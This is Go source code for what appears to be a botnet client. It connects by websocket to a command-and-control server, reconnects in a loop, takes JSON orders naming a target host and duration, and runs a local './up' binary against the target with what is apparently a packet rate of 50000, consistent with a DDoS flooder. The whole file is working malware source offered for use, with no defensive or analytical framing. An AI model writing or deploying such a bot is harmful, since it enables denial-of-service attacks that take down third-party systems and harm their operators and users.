package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"os/exec"
	"time"

	"github.com/gorilla/websocket"
)

type Command struct {
	Host     string `json:"host"`
	Duration string `json:"duration"`
	Method   string `json:"method"`
}

func connect(addr string) {
	for {
		log.Printf("connecting to %s ...", addr)
		conn, _, err := websocket.DefaultDialer.Dial(addr, nil)
		if err != nil {
			log.Printf("connection failed: %v — retrying in 5s", err)
			time.Sleep(5 * time.Second)
			continue
		}
		log.Println("connected to C2")
		listen(conn)
		conn.Close()
		log.Println("disconnected, retrying in 5s")
		time.Sleep(5 * time.Second)
	}
}

func listen(conn *websocket.Conn) {
	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			log.Printf("read error: %v", err)
			return
		}

		var cmd Command
		if err := json.Unmarshal(msg, &cmd); err != nil {
			log.Printf("invalid command: %v", err)
			continue
		}

		log.Printf("received command: host=%s duration=%s method=%s", cmd.Host, cmd.Duration, cmd.Method)
		go runCommand(cmd)
	}
}

func runCommand(cmd Command) {
	args := []string{cmd.Host, cmd.Duration, "50000"}
	log.Printf("running: ./up %s", fmt.Sprintf("%s %s 50000", cmd.Host, cmd.Duration))

	out, err := exec.Command("./up", args...).CombinedOutput()
	if err != nil {
		log.Printf("command error: %v\noutput: %s", err, string(out))
		return
	}
	log.Printf("command done:\n%s", string(out))
}

func main() {
	host := flag.String("host", "", "C2 server host/IP (required)")
	port := flag.String("port", "", "C2 server port (required)")
	flag.Parse()

	if *host == "" || *port == "" {
		log.Fatal("both -host and -port are required")
	}

	addr := fmt.Sprintf("ws://%s:%s/recon", *host, *port)
	connect(addr)
}
